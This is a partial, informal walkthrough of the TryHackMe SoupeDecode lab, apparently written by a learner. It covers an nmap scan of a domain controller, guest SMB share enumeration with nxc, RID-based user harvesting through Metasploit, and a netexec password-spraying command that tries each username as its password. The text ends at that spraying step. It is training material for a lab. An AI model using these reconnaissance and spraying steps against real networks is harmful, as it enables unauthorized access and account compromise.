So this is the SoupeDecode challenge on TryHackMe.


u can find it inside the tryhackme easy difficulty room.


so let s begin by taking a look at the challenge description.


# Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.#

so this is kinda of a challenge about domain controllers and kerberos authentication.smb shares and everythings

so first we gonna do a nmap scan to see what ports are open on the target machine.
by the way all the tools u gonna use here is already pre installed inside a kali linux machine.or a parrot os machine.


using = nmap -sC -sV -p- -T4 --min-rate=1000 -oN nmap/allports.txt
so the flag -sC for default script
*the flag -sV for version detection
*the flag -p- for all ports
*the flag -T4 for faster scan
*the flag --min-rate=1000 for minimum rate of 1000 packets per second
*the flag -oN for output in normal format


we got the response from nmap 
#
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-04 11:44:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:  
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-04T11:45:40+00:00
|_ssl-date: 2026-02-04T11:46:19+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-02-03T11:25:31
|_Not valid after:  2026-08-05T11:25:31
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49713/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
#




okay so here we have a bunch of open port the first thinks i m gonna do is trying to enemurate the SMB and to see if the guest account is enabled or not because if the guest account is enabled we can use it to access the SMB shares and maybe find some useful information there.


**there are one way with metasploit using the lookupsid module where we give the  RHOSTS the guest smbUser and let it treat it
u just navigate in metasploit and see it 

 
**and another way using nxcat where we can use the smbclient to connect to the smb shares and see if we can access them with the guest account.


command : nxc smb \\<IP_ADDRESS>\ -u "guest" -p "" --shares

#
output:
SMB         10.67.184.231   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01)
(domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.67.184.231   445    DC01             [+] SOUPEDECODE.LOCAL\guest:  
SMB         10.67.184.231   445    DC01             [*] Enumerated shares
SMB         10.67.184.231   445    DC01             Share           Permissions     Remark
SMB         10.67.184.231   445    DC01             -----           -----------     ------
SMB         10.67.184.231   445    DC01             ADMIN$                          Remote Admin
SMB         10.67.184.231   445    DC01             backup                           
SMB         10.67.184.231   445    DC01             C$                              Default share
SMB         10.67.184.231   445    DC01             IPC$            READ            Remote IPC
SMB         10.67.184.231   445    DC01             NETLOGON                        Logon server share
SMB         10.67.184.231   445    DC01             SYSVOL                          Logon server share
SMB         10.67.184.231   445    DC01             Users
#

because the guest account is enabled we can access the smb shares and we can see that there are some interesting shares like backup and users and maybe we can find some useful information there.
// there is backup which may be useful later


i only have read access to the IPC$ share and nothing else so the metasploit is kinda the better way to do it so i take the lookupsid module and i give it the RHOSTS the guest smbUser and let it treat it and see if we can find some useful information there.

it returned 1069 accounts 

so now we have a list of users that we can use to perform password spraying attack to find valid credentials.

i used a python script to only get the username from the input from metasploit

then with only the username:


o
## so the objectif is to try out all the username with a password same as the username to see if we can find any valid credentials.

command : netexec smb \\<IP_ADDRESS>\ -u user.txt -p user1.txt -no-bruteforce | grep -v FAILURE
